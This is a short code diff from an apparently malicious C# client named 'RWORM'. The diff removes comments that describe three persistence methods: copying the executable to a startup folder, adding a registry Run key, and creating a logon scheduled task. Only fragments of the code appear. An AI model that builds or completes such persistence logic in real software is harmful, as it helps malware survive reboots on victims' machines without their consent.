@@ -23,7 +23,7 @@ namespace RWORM.Client.Modules
 
                 string targetPath = currentExe;
 
-                // Copy to startup directory if configured and not already running from there
+                
                 if (!string.IsNullOrWhiteSpace(Config.StartupPath))
                 {
                     try
@@ -40,7 +40,7 @@ namespace RWORM.Client.Modules
                     catch { }
                 }
 
-                // Registry Run Key: HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+                
                 if (Config.StartupRegistry)
                 {
                     try
@@ -51,7 +51,7 @@ namespace RWORM.Client.Modules
                     catch { }
                 }
 
-                // Scheduled Tasks (SCHTASKS on user logon)
+                
                 if (Config.SchTasks)
                 {
                     try
